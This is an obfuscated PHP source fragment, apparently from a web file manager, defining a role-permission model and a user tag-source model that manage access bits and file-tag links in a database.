$§§ÇÍ® = parent::listData(); foreach ($§§ÇÍ® as $£ì¥¢¶İ) { $ÉÄ´­Êõ = intval($£ì¥¢¶İ[$€ªÑŞ¥ø[455]]); if ($ÉÄ´­Êõ <= 0 || $£ì¥¢¶İ[$€ªÑŞ¥ø[1921]] == 0) { continue; } if (($ÉÄ´­Êõ & $ìñ¶ª±‚) != $ìñ¶ª±‚) { continue; } if (($ÉÄ´­Êõ & $·âø·”„) != 0) { continue; } return $£ì¥¢¶İ[$€ªÑŞ¥ø[443]]; } return !1; } public function findAuthReadOnly() { $•›¢†©š = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $·èÖ”úª = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($•›¢†©š, $·èÖ”úª); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $ü¨Ö¡ªÎ =& $_SERVER[çâ¥×ø³]; $ù˜¼ë = parent::listData(); $Û…Æ¼Æ = !1; foreach ($ù˜¼ë as $½ÃöëÅ) { if ($½ÃöëÅ[$ü¨Ö¡ªÎ[455]] <= 0 || $½ÃöëÅ[$ü¨Ö¡ªÎ[1921]] == $ü¨Ö¡ªÎ[212]) { continue; } if (!$Û…Æ¼Æ) { $Û…Æ¼Æ = $½ÃöëÅ; continue; } if ($Û…Æ¼Æ[$ü¨Ö¡ªÎ[455]] > $½ÃöëÅ[$ü¨Ö¡ªÎ[455]]) { $Û…Æ¼Æ = $½ÃöëÅ; } } return $Û…Æ¼Æ ? $Û…Æ¼Æ[$ü¨Ö¡ªÎ[443]] : $ü¨Ö¡ªÎ[12]; } public function listData($°¼÷¥ˆÃ = false, $£É•Àòâ = "\163\157\162\164", $›–¿¦ = false) { return parent::listData($°¼÷¥ˆÃ, $£É•Àòâ, $›–¿¦); } public function update($¥„×Îıå, $Šùõ™´¶) { $ª®¹èøÉ =& $_SERVER[çâ¥×ø³]; $„ÛÀÅ™Ë = parent::listData($¥„×Îıå); $û”ºâ«Ò = $this->findByName($Šùõ™´¶[$ª®¹èøÉ[32]]); if (!$„ÛÀÅ™Ë || $û”ºâ«Ò && $û”ºâ«Ò[$ª®¹èøÉ[443]] != $„ÛÀÅ™Ë[$ª®¹èøÉ[443]]) { return !1; } $this->filterAuth($Šùõ™´¶[$ª®¹èøÉ[455]]); return parent::update($¥„×Îıå, $Šùõ™´¶); } public function remove($Õ°ğ¨ò¥) { $ÂÂ‚ğ©› = parent::listData($Õ°ğ¨ò¥); if (!$ÂÂ‚ğ©› || $ÂÂ‚ğ©›[$_SERVER[çâ¥×ø³][179]]) { return !1; } return parent::remove($Õ°ğ¨ò¥); } public function add($×±ª×Ä = array()) { $ê¶Òµ—ß =& $_SERVER[çâ¥×ø³]; if ($this->findByName($×±ª×Ä[$ê¶Òµ—ß[32]])) { return !1; } $•ËïÚâ• = array($ê¶Òµ—ß[32] => $ê¶Òµ—ß[12], $ê¶Òµ—ß[455] => 1, $ê¶Òµ—ß[1922] => $ê¶Òµ—ß[1909], $ê¶Òµ—ß[1921] => 1, $ê¶Òµ—ß[179] => 0, $ê¶Òµ—ß[1923] => 0); $×±ª×Ä = array_merge($•ËïÚâ•, $×±ª×Ä); $×±ª×Ä[$ê¶Òµ—ß[1923]] = $this->getSort(); $this->filterAuth($×±ª×Ä[$ê¶Òµ—ß[455]]); return parent::insert($×±ª×Ä); } private function getSort() { $‡×¼ì÷ê =& $_SERVER[çâ¥×ø³]; $¸Í¹ìçö = parent::listData(); $ºİŠéË­ = array_to_keyvalue($¸Í¹ìçö, $‡×¼ì÷ê[12], $‡×¼ì÷ê[1923]); return empty($ºİŠéË­) ? 0 : max($ºİŠéË­) + 1; } private function filterAuth(&$¾ĞÃ½ö ) { if (!$¾ĞÃ½ö ) { return; } $Ëšö²ÓÚ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $İúä˜ù = array(); foreach ($Ëšö²ÓÚ as $Ù¨İ¥ÏŒ) { if ($¾ĞÃ½ö  & $Ù¨İ¥ÏŒ) { $İúä˜ù[] = $Ù¨İ¥ÏŒ; } } if (in_array(self::AUTH_ROOT, $İúä˜ù)) { $¾ĞÃ½ö  = array_sum($Ëšö²ÓÚ); return; } $Ÿ›œÑò¡ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($İúä˜ù as $Ù¨İ¥ÏŒ) { if (isset($Ÿ›œÑò¡[$Ù¨İ¥ÏŒ])) { $İúä˜ù = array_merge($İúä˜ù, $Ÿ›œÑò¡[$Ù¨İ¥ÏŒ]); } } $İúä˜ù[] = self::AUTH_SHOW; $¾ĞÃ½ö  = array_sum(array_unique($İúä˜ù)); } public function sort($Ï×õıÔ¥, $ûÍ¬çÏ¹) { return parent::update($Ï×õıÔ¥, $ûÍ¬çÏ¹); } } goto AÏÃ¾çö°; E‹³†ª§Ó¥: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\163\145\x72\x5f\x66\x61\x76"; protected function cacheFunctionAlias($éô¹Éó) { $³Ó†üü“ =& $_SERVER[çâ¥×ø³]; return array($³Ó†üü“[2010] => array($³Ó†üü“[2401] . USER_ID, $³Ó†üü“[2011])); } protected function listData() { $™¯ƒÀ¥¯ =& $_SERVER[çâ¥×ø³]; $ŒşÙ‹ = array($™¯ƒÀ¥¯[1692] => USER_ID, $™¯ƒÀ¥¯[525] => array($™¯ƒÀ¥¯[2014], 0)); $ğ»Ğ÷×ï = $™¯ƒÀ¥¯[2402]; $¯ŒøÎü¸ = $this->field($ğ»Ğ÷×ï)->where($ŒşÙ‹)->order($™¯ƒÀ¥¯[2017])->select(); return $¯ŒøÎü¸ ? $¯ŒøÎü¸ : array(); } protected function addToTag($Ñª¥—¤—, $îùÄ¶û¼) { $ÓÛ–³£· =& $_SERVER[çâ¥×ø³]; if (!Model($ÓÛ–³£·[2159])->listData($îùÄ¶û¼)) { return !1; } if (is_numeric($Ñª¥—¤—)) { $²²â˜ú = Model($ÓÛ–³£·[874])->pathInfo($Ñª¥—¤—); if (!$²²â˜ú) { return !1; } } else { $²²â˜ú = IO::infoSimple($Ñª¥—¤—); if (!$²²â˜ú) { return !1; } $¯Û»åÁ = $²²â˜ú[$ÓÛ–³£·[32]]; $ì¿¤ÙÑ­ = $²²â˜ú[$ÓÛ–³£·[33]]; if (isset($²²â˜ú[$ÓÛ–³£·[453]])) { $ì¿¤ÙÑ­ = $²²â˜ú[$ÓÛ–³£·[453]] == $ÓÛ–³£·[88] ? $ÓÛ–³£·[75] : $ÓÛ–³£·[214]; } } $Œó÷ÉŒ = array($ÓÛ–³£·[1692] => USER_ID, $ÓÛ–³£·[525] => $îùÄ¶û¼, $ÓÛ–³£·[463] => $Ñª¥—¤—, $ÓÛ–³£·[464] => $ì¿¤ÙÑ­ ? $ì¿¤ÙÑ­ : $ÓÛ–³£·[458], $ÓÛ–³£·[462] => $¯Û»åÁ ? $¯Û»åÁ : $ÓÛ–³£·[12], $ÓÛ–³£·[1903] => 0); if ($this->where($Œó÷ÉŒ)->find()) { return !1; } return $this->add($Œó÷ÉŒ); } protected function removeFromTag($øõ•Œ§ü, $¢ª˜óò) { $¸¨À‚ÓÌ =& $_SERVER[çâ¥×ø³]; if (!Model($¸¨À‚ÓÌ[2159])->listData($¢ª˜óò)) { return !1; } if (is_array($øõ•Œ§ü)) { $øõ•Œ§ü = array($¸¨À‚ÓÌ[7], $øõ•Œ§ü); } $…æ–»—œ = array($¸¨À‚ÓÌ[1692] => USER_ID, $¸¨À‚ÓÌ[525] => $¢ª˜óò, $¸¨À‚ÓÌ[463] => $øõ•Œ§ü); return $this->where($…æ–»—œ)->delete(); } protected function removeByTag($¨í²î³†) { $—â‘“×Î =& $_SERVER[çâ¥×ø³]; if (!$¨í²î³†) { return !1; } $ø¶ßœ„‡ = array($—â‘“×Î[1692] => USER_ID, $—â‘“×Î[525] => $¨í²î³†); return $this->where($ø¶ßœ„‡)->delete(); } protected function removeBySource($³·ú¢¿) { $¸—ƒ‘ã¯ =& $_SERVER[çâ¥×ø³]; if (is_array($³·ú¢¿)) { $³·ú¢¿ = array($¸—ƒ‘ã¯[7], $³·ú¢¿); } $ù¦’€¨• = array($¸—ƒ‘ã¯[1692] => USER_ID, $¸—ƒ‘ã¯[525] => array($¸—ƒ‘ã¯[1067], 0), $¸—ƒ‘ã¯[463] => $³·ú¢¿); return $this->where($ù¦’€¨•)->delete(); } }